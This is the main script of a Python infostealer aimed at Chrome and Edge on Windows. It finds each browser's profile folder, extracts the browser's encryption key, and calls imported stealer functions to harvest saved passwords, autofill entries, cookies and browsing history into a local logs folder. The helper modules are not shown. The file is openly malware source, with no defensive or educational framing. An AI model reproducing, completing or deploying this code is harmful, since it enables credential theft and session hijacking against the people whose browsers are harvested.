""" IMPORTS """
import os
from credentials import credential_stealer
from autofill import autofill_stealer
from cookies import cookie_stealer
from history import history_stealer
from util import TEMP_PATH, LOGS_PATH, get_encryption_key


# Browser information
browsers = [
    {
        'name': 'Chrome',
        'path': os.getenv('localappdata') + r'\Google\Chrome\User Data',
    },
    {
        'name': 'Edge',
        'path': os.getenv('localappdata') + r'\Microsoft\Edge\User Data',
    },
]


if __name__ == '__main__':
    # Create temp directory for sql database copies
    if not os.path.exists(TEMP_PATH):
        os.mkdir(TEMP_PATH)
    # Create logs directory for extracted data
    if not os.path.exists(LOGS_PATH):
        os.mkdir(LOGS_PATH)

    # Extract from installed Chromium browsers
    for browser in browsers:
        if os.path.exists(browser['path']):
            # Extract encryption key for the browser
            encryption_key = get_encryption_key(browser['path'])
            # Extract information
            credential_stealer(browser, encryption_key)
            autofill_stealer(browser, encryption_key)
            cookie_stealer(browser, encryption_key)
            history_stealer(browser, encryption_key)
